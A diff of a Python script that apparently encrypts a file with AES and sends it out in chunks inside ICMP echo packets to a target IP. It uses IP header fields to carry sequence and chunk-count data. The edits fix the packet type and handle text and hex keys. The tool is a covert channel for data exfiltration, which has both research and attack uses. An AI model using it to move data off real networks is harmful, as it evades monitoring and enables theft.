@@ -75,7 +75,7 @@ def embed_in_ipv4(chunk, target_ip, sequence_num, total_chunks):
     
     # Create packet with ID field containing sequence number
     # ID field is 16 bits, so we can use it to indicate chunk sequence
-    packet = IP(dst=target_ip, id=sequence_num) / ICMP() / Raw(load=chunk)
+    packet = IP(dst=target_ip, id=sequence_num) / ICMP(type=8, code=0) / Raw(load=chunk)
     
     # ToS field (8 bits) can be used to indicate total number of chunks
     # Limited to 255 chunks with this method
@@ -141,9 +141,22 @@ def main():
     input_data = read_file(args.input, 'rb')
     print(f"Read {len(input_data)} bytes")
     
+    # For text files, make sure we're working with bytes
+    if isinstance(input_data, str):
+        input_data = input_data.encode('utf-8')
+    
     # Read encryption key
     print(f"Reading key file: {args.key}")
     key = read_key(args.key)
+    
+    # For compatibility with the provided AES_Library_With_Chunker code
+    # Check if key is a hex string and convert if needed
+    if all(c in '0123456789abcdefABCDEF' for c in key.decode('ascii', errors='ignore')):
+        try:
+            key = bytes.fromhex(key.decode('ascii'))
+            print("Converted hex key string to bytes")
+        except Exception as e:
+            print(f"Warning: Failed to convert key as hex: {e}")
     
     # Encrypt the data
     print("Encrypting data...")
